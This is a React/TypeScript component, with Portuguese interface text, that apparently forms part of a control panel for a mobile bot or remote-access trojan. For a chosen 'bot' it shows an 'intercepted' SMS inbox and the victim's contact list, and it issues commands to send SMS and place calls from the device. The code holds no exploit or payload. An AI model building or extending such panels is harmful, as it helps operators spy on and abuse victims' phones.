import React, { useState } from 'react';
import type { Bot } from '../types';
import { StorageService } from '../services/storage';

interface SMSManagerProps {
  bot: Bot;
}

export const SMSManager: React.FC<SMSManagerProps> = ({ bot }) => {
  const [phoneInput, setPhoneInput] = useState('');
  const [smsMessage, setSmsMessage] = useState('');
  const [dialNumber, setDialNumber] = useState('');
  
  const smsList = StorageService.getSms(bot.id);
  const contacts = StorageService.getContacts();

  const handleSendSms = (e: React.FormEvent) => {
    e.preventDefault();
    if (!phoneInput || !smsMessage) return;

    StorageService.sendSmsCommand(bot.id, phoneInput, smsMessage);
    setSmsMessage('');
    alert(`Comando de SMS enviado para: ${phoneInput}`);
  };

  const handleDialerClick = (num: string) => {
    setDialNumber(prev => prev + num);
  };

  const handleTriggerCall = () => {
    if (!dialNumber) return;
    StorageService.addLog('warning', `Comando de ligação efetuada enviado para número: ${dialNumber}`, bot.id, bot.name);
    alert(`Comando de ligação efetuado para: ${dialNumber}`);
    setDialNumber('');
  };

  return (
    <div className="sms-grid-container" style={{ display: 'grid', gridTemplateColumns: '1fr 320px', gap: '16px', padding: '16px' }}>
      
      {/* Left Column: SMS Log and Contacts */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
        
        {/* Intercepted SMS Feed */}
        <div className="glass-panel" style={{ padding: '16px' }}>
          <h4 style={{ fontSize: '15px', fontWeight: '600', marginBottom: '10px', borderBottom: '1px solid var(--border-color)', paddingBottom: '4px' }}>
            Caixa de SMS Interceptada
          </h4>
          <div style={{ display: 'flex', flexDirection: 'column', gap: '6px', maxHeight: '240px', overflowY: 'auto' }}>
            {smsList.length === 0 ? (
              <p style={{ color: 'var(--text-muted)', textAlign: 'center', padding: '20px', fontSize: '13px' }}>Nenhum SMS interceptado ainda.</p>
            ) : (
              smsList.map(sms => (
                <div 
                  key={sms.id}
                  style={{
                    padding: '8px 12px',
                    borderRadius: '8px',
                    background: sms.type === 'received' ? 'rgba(6, 182, 212, 0.04)' : 'rgba(139, 92, 246, 0.04)',
                    border: sms.type === 'received' ? '1px solid rgba(6, 182, 212, 0.08)' : '1px solid rgba(139, 92, 246, 0.08)',
                    display: 'flex',
                    flexDirection: 'column',
                    gap: '2px'
                  }}
                >
                  <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '11px', color: 'var(--text-secondary)' }}>
                    <span>{sms.type === 'received' ? '📥 De' : '📤 Para'}: <strong>{sms.phone}</strong></span>
                    <span>{sms.timestamp}</span>
                  </div>
                  <div style={{ fontSize: '12px', color: 'var(--text-primary)' }}>{sms.message}</div>
                </div>
              ))
            )}
          </div>
        </div>

        {/* Contacts list */}
        <div className="glass-panel" style={{ padding: '16px' }}>
          <h4 style={{ fontSize: '15px', fontWeight: '600', marginBottom: '10px', borderBottom: '1px solid var(--border-color)', paddingBottom: '4px' }}>
            Lista de Contatos
          </h4>
          <div style={{ display: 'flex', flexDirection: 'column', gap: '6px', maxHeight: '200px', overflowY: 'auto' }}>
            {contacts.map((contact, i) => (
              <div 
                key={i}
                style={{ 
                  display: 'flex', 
                  justifyContent: 'space-between', 
                  alignItems: 'center', 
                  padding: '6px 10px', 
                  background: 'var(--bg-secondary)', 
                  border: '1px solid var(--border-color)',
                  borderRadius: '6px',
                  gap: '8px'
                }}
              >
                <div style={{ minWidth: 0, flex: 1 }}>
                  <div style={{ fontWeight: '500', fontSize: '12px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{contact.name}</div>
                  <div style={{ fontSize: '10px', color: 'var(--text-secondary)', fontFamily: 'var(--font-mono)' }}>{contact.phone}</div>
                </div>
                <div style={{ display: 'flex', gap: '4px', flexShrink: 0 }}>
                  <button 
                    className="btn btn-secondary" 
                    onClick={() => { setPhoneInput(contact.phone); }}
                    style={{ padding: '2px 6px', fontSize: '11px', minHeight: '26px' }}
                  >
                    SMS
                  </button>
                  <button 
                    className="btn btn-secondary" 
                    onClick={() => { setDialNumber(contact.phone); }}
                    style={{ padding: '2px 6px', fontSize: '11px', minHeight: '26px' }}
                  >
                    Discar
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>

      </div>

      {/* Right Column: Send SMS and Call Dialer */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
        
        {/* Send SMS Box */}
        <div className="glass-panel" style={{ padding: '16px' }}>
          <h4 style={{ fontSize: '15px', fontWeight: '600', marginBottom: '8px' }}>Enviar SMS</h4>
          <form onSubmit={handleSendSms} style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
            <input 
              type="text" 
              placeholder="Número (+55...)" 
              value={phoneInput}
              onChange={(e) => setPhoneInput(e.target.value)}
              style={{ fontSize: '12px', padding: '8px 12px' }}
              required
            />
            <textarea 
              placeholder="Mensagem..." 
              value={smsMessage}
              onChange={(e) => setSmsMessage(e.target.value)}
              style={{ fontSize: '12px', minHeight: '60px', resize: 'none', padding: '8px 12px' }}
              required
            />
            <button type="submit" className="btn btn-primary" style={{ padding: '6px', minHeight: '34px', fontSize: '13px' }}>
              Enviar SMS
            </button>
          </form>
        </div>

        {/* Dialer Panel (Keypad) */}
        <div className="glass-panel" style={{ padding: '16px', display: 'flex', flexDirection: 'column', gap: '10px' }}>
          <h4 style={{ fontSize: '15px', fontWeight: '600' }}>Teclado de Chamada</h4>
          
          <div style={{ 
            background: 'var(--bg-primary)', 
            border: '1px solid var(--border-color)', 
            borderRadius: '6px', 
            padding: '8px', 
            textAlign: 'center', 
            fontFamily: 'var(--font-mono)', 
            fontSize: '16px', 
            color: 'var(--accent-cyan)',
            minHeight: '38px',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center'
          }}>
            {dialNumber || 'Número'}
          </div>

          {/* Grid Layout of the Keyboard */}
          <div style={{ 
            display: 'grid', 
            gridTemplateColumns: 'repeat(3, 1fr)', 
            gap: '8px',
            justifyItems: 'center'
          }}>
            {['1', '2', '3', '4', '5', '6', '7', '8', '9', '*', '0', '#'].map(num => (
              <button
                key={num}
                onClick={() => handleDialerClick(num)}
                style={{
                  width: '44px',
                  height: '44px',
                  borderRadius: '50%',
                  background: 'var(--bg-tertiary)',
                  border: '1px solid var(--border-color)',
                  color: 'white',
                  fontSize: '16px',
                  fontWeight: '600',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  cursor: 'pointer',
                  minHeight: 'auto'
                }}
                onMouseEnter={(e) => e.currentTarget.style.background = 'var(--accent-purple)'}
                onMouseLeave={(e) => e.currentTarget.style.background = 'var(--bg-tertiary)'}
              >
                {num}
              </button>
            ))}
          </div>

          <div style={{ display: 'flex', gap: '6px', marginTop: '4px' }}>
            <button 
              className="btn btn-danger" 
              onClick={() => setDialNumber('')}
              style={{ flex: 1, padding: '6px', minHeight: '34px', fontSize: '12px' }}
            >
              Limpar
            </button>
            <button 
              className="btn btn-primary" 
              onClick={handleTriggerCall}
              style={{ flex: 2, padding: '6px', minHeight: '34px', fontSize: '12px', background: 'var(--success)' }}
            >
              📞 Efetuar Ligação
            </button>
          </div>
        </div>

      </div>

      <style>{`
        @media (max-width: 1024px) {
          .sms-grid-container {
            grid-template-columns: 1fr !important;
          }
        }
      `}</style>
    </div>
  );
};
